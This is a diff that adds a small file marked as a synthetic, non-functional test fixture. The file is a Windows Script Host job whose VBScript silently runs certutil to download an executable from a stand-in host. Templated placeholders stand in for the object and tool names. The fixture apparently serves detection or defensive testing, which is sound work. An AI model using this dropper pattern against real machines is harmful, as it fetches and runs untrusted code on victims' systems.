@@ -1,0 +1,4 @@
+<!-- SYNTHETIC TEST FIXTURE — not functional -->
+<job><script language="VBScript">
+CreateObject("{{WSCRIPT}}.Shell").Run "{{CERTUTIL}} -urlcache -f https://payload.example.invalid/s.exe s.exe", 0
+</script></job>
